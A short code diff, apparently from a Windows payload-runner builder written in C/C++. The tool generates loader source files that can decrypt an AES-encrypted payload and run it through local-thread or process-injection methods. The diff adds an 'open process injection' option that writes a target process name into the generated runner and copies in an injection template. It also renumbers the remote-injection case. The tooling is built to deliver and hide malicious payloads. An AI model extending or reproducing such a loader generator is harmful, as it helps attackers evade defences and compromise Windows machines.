@@ -84,7 +84,7 @@ BOOL WriteRunner(IN PVOID pPayload, IN SIZE_T sPayloadSize, IN struct UserOption
 	{
 		fprintf(fRunner, "#include \"aes.h\"\n");
 	}
-	if (sMenuOptions.cExecute != 1) // Adds helper function needed for process enum and injection.
+	if (sMenuOptions.cExecute != 1 && sMenuOptions.cExecute != 2) // Adds helper function needed for remote process enum and injection.
 	{
 		Copyfile("..\\..\\..\\Assets\\Headers\\remoteProcessHelper.c", fRunner);
 	}
@@ -128,8 +128,17 @@ BOOL WriteWin32Execution(IN FILE* fRunner, IN struct UserOptions sMenuOptions)
 		Copyfile("..\\..\\..\\Assets\\Execution\\Win32\\localThread.c", fRunner);
 		break;
 	}
+
+		// Open process injection
+	case 2:
+	{
+		fprintf(fRunner, "LPCWSTR sProcessName = L\"%s\";\n", sMenuOptions.sProcess.c_str());
+		Copyfile("..\\..\\..\\Assets\\Execution\\Win32\\openProcess.c", fRunner);
+		break;
+	}
+
 		// Remote process injection
-	case 2: 
+	case 3: 
 	{
 		fprintf(fRunner, "LPWSTR sProcessName = \"%s\";\n", sMenuOptions.sProcess);
 		Copyfile("..\\..\\..\\Assets\\Execution\\Win32\\remoteProcess.c", fRunner);
